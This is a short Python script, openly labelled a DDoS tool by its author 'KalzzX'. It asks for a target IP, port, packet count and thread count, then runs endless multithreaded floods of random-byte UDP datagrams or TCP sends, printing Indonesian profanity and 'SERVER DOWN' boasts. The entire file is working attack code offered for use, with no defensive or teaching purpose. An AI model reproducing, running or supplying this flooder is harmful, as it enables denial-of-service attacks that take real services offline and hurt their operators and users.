#!/usr/bin/env python3
#Ddos by KalzzX
import random
import socket
import threading
import os

os.system("clear")








print("===================================================")
print("          !!!JANGAN DI SEBAR YA!!!    ")   
print("           |-REMAKE BY : KALZZX-|     ") 

ip = str(input(" DDOSATTACKBYKALZZX | Ip:"))
port = int(input(" DDOSATTACKBYKALZZX | Port:"))
choice = str(input(" DDOSATTACKBYKALZZX | Gas Gak Ni?(y/n):"))
times = int(input(" DDOSATTACKBYKALZZX | Packets:"))
threads = int(input(" DDOSATTACKBYKALZZX | Threads:"))
def run():
	data = random._urandom(12288)
	i = random.choice(("[ASU]","[KONTOL]","[BANGSAT]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" KalzzX Membantai!!! ")
		except:
			print("[BANGSAT] SERVER DOWN!!! ")

def run2():
	data = random._urandom(128)
	i = random.choice(("[ASU]","[KONTOL]","[BANGSAT]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" KalzzX Membantai!!! ")
		except:
			s.close()
			print("[BANGSAT] SERVER DOWN!!! ")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
